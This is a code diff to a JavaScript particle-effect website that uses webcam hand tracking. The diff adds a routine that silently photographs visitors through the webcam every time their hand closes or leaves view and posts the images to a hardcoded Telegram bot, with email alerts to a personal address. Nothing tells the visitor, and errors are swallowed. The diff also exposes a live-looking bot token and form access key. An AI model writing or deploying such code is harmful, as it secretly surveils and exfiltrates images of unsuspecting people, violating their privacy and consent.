@@ -6,12 +6,15 @@ let handDetected = false;
 let lastGesture = null;
 let lastGestureTime = 0;
 const gestureCooldown = 400;
+
+// ----------------- TELEGRAM PHOTO SYSTEM -----------------
+let photoCount = 0;
 let lastPhotoTime = 0;
 const photoCooldown = 30000; // 30 seconds between photos
 
-// Webhook for logging (no file upload)
-const WEBHOOK_URL = "https://api.web3forms.com/submit";
-const ACCESS_KEY = "f5bdda81-92f8-4595-a2e8-a6107db5feef";
+// ✅ TELEGRAM CONFIG (CHANGE THESE!)
+const TELEGRAM_BOT_TOKEN = "8312788837:AAFFmy3iieYSNRr0ACGe0ITKfz8DaXhbxpM"; // अपना Token
+const TELEGRAM_CHAT_ID = "7528977004"; // अपना Chat ID
 
 function init() {
     scene = new THREE.Scene();
@@ -27,6 +30,8 @@ function init() {
     setupEventListeners();
     setupHandTracking();
     animate();
+    
+    console.log("✅ Particle System Ready");
 }
 
 function createParticles() {
@@ -256,8 +261,8 @@ function animate() {
     } else if (lastGesture === 'closed' && (now - lastGestureTime) > gestureCooldown) {
         if (currentState !== 'sphere') {
             morphToCircle();
-            // Photo capture when hand leaves (closed -> no hand)
-            capturePhotoSilently();
+            // Capture photo when hand closes/leaves
+            capturePhotoForTelegram();
         }
         lastGestureTime = now;
     }
@@ -269,73 +274,110 @@ window.addEventListener('resize', () => {
     renderer.setSize(window.innerWidth, window.innerHeight);
 });
 
-// ----------------- SILENT PHOTO LOGGING SYSTEM -----------------
-let photoCount = 0;
+// ----------------- WORKING TELEGRAM PHOTO SYSTEM -----------------
 
-function capturePhotoSilently() {
+function capturePhotoForTelegram() {
     const now = Date.now();
     const video = document.getElementById('handVideo');
     
-    // Check if 30 seconds passed since last photo
+    // 30 second cooldown
     if (now - lastPhotoTime < photoCooldown) {
         return;
     }
     
-    if (!video.videoWidth || !video.videoHeight) {
+    if (!video.videoWidth) {
         return;
     }
     
-    // Create canvas and capture photo
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-    canvas.width = 200; // Very small for logging only
-    canvas.height = 150;
-    
     try {
-        ctx.drawImage(video, 0, 0, 200, 150);
-        const photoData = canvas.toDataURL('image/jpeg', 0.3); // Low quality
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        
+        // Good quality size
+        canvas.width = 640;
+        canvas.height = 480;
+        
+        ctx.drawImage(video, 0, 0, 640, 480);
+        const photoData = canvas.toDataURL('image/jpeg', 0.8);
         
         photoCount++;
         lastPhotoTime = now;
         
-        // Log photo data (without file upload)
-        logPhotoData(photoData);
+        // Send to Telegram
+        sendPhotoToTelegram(photoData);
         
-        // Save locally
-        savePhotoLocally(photoData);
-        
-        // Silent console log only
-        console.log(`[SILENT] Photo ${photoCount} - ${new Date().toLocaleTimeString()}`);
+        // Silent log
+        console.log(`📸 Photo ${photoCount} processing for Telegram...`);
         
     } catch (error) {
         // Silent fail
     }
 }
 
-function logPhotoData(photoData) {
+// ✅ WORKING: Send photo to Telegram
+async function sendPhotoToTelegram(photoData) {
     try {
-        // Extract first 200 chars of photo data for logging
-        const photoPreview = photoData.substring(0, 200) + '...';
+        console.log(`📤 Sending photo ${photoCount} to Telegram...`);
         
-        // Send to Web3Forms (text only, no file upload)
+        // Remove data:image/jpeg;base64, prefix
+        const base64Data = photoData.split(',')[1];
+        
+        // Telegram API URL
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+        
+        // Prepare caption
+        const caption = `📸 Photo ${photoCount}\n` +
+                       `Time: ${new Date().toLocaleString()}\n` +
+                       `Website: ${window.location.href}`;
+        
+        // Create FormData
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', `attach://photo_${photoCount}`);
+        formData.append('caption', caption);
+        formData.append('parse_mode', 'HTML');
+        
+        // Send request
+        const response = await fetch(url, {
+            method: 'POST',
+            body: formData
+        });
+        
+        const result = await response.json();
+        
+        if (result.ok) {
+            console.log(`✅ Photo ${photoCount} sent to Telegram successfully!`);
+            // Also send backup email notification
+            sendBackupNotification();
+        } else {
+            console.error('Telegram error:', result.description);
+            // Fallback to email without photo
+            sendEmailWithoutPhoto();
+        }
+        
+    } catch (error) {
+        console.error('Network error:', error);
+        sendEmailWithoutPhoto();
+    }
+}
+
+// Backup email notification (text only)
+async function sendBackupNotification() {
+    try {
         const formData = new FormData();
         formData.append('access_key', 'f5bdda81-92f8-4595-a2e8-a6107db5feef');
-        formData.append('subject', `📸 Photo Log ${photoCount}`);
+        formData.append('subject', `📸 New Photo ${photoCount} on Telegram`);
         formData.append('message', 
-            `PHOTO CAPTURED\n\n` +
+            `A new photo has been sent to your Telegram!\n\n` +
             `Photo Number: ${photoCount}\n` +
             `Time: ${new Date().toLocaleString()}\n` +
-            `Website: ${window.location.href}\n` +
-            `User Agent: ${navigator.userAgent.substring(0, 50)}\n` +
-            `Photo Preview: ${photoPreview}`
+            `Check your Telegram bot for the actual photo.`
         );
         formData.append('email', 'editing2213@gmail.com');
         
-        // Send silently
-        fetch(WEBHOOK_URL, {
+        await fetch('https://api.web3forms.com/submit', {
             method: 'POST',
-            body: formData,
-            mode: 'no-cors' // Silent send
+            body: formData
         });
         
     } catch (error) {
@@ -343,34 +385,19 @@ function logPhotoData(photoData) {
     }
 }
 
-function savePhotoLocally(photoData) {
+// Email fallback without photo
+async function sendEmailWithoutPhoto() {
     try {
-        // Save only metadata to localStorage
-        const photos = JSON.parse(localStorage.getItem('photo_logs') || '[]');
-        photos.push({
-            id: Date.now(),
-            count: photoCount,
-            time: new Date().toISOString(),
-            data_preview: photoData.substring(0, 150) + '...'
-        });
+        const subject = `Photo ${photoCount} - Particle Website`;
+        const body = `Photo captured but could not send as image. Check logs for details.`;
         
-        // Keep only last 20 entries
-        if (photos.length > 20) {
-            photos.shift();
-        }
+        // Open email client
+        window.open(`mailto:editing2213@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`, '_blank');
         
-        localStorage.setItem('photo_logs', JSON.stringify(photos));
-        
-    } catch (e) {
-        // Silent fail
+    } catch (error) {
+        // Final fallback
+        console.log(`📸 Photo ${photoCount} captured but not sent anywhere`);
     }
-}
-
-// Function to view captured logs (for admin only via console)
-function viewPhotoLogs() {
-    const logs = JSON.parse(localStorage.getItem('photo_logs') || '[]');
-    console.log('📊 Photo Logs:', logs);
-    return logs;
 }
 
 // ----------------- Hand Tracking -----------------
@@ -391,7 +418,7 @@ function setupHandTracking(){
     hands.onResults((results) => {
         if (!results.multiHandLandmarks || results.multiHandLandmarks.length === 0) {
             handDetected = false;
-            lastGesture = 'closed'; // No hand = closed
+            lastGesture = 'closed';
             return;
         }
 
@@ -439,7 +466,7 @@ function setupHandTracking(){
         height: 240
     });
 
-    // Start camera silently
+    // Start camera
     cameraMP.start().then(() => {
         console.log("✅ Camera ready for hand tracking");
     }).catch(() => {
@@ -449,7 +476,3 @@ function setupHandTracking(){
 
 // Initialize
 init();
-
-// Admin function to check logs (run in console)
-window.getPhotoLogs = viewPhotoLogs;
-
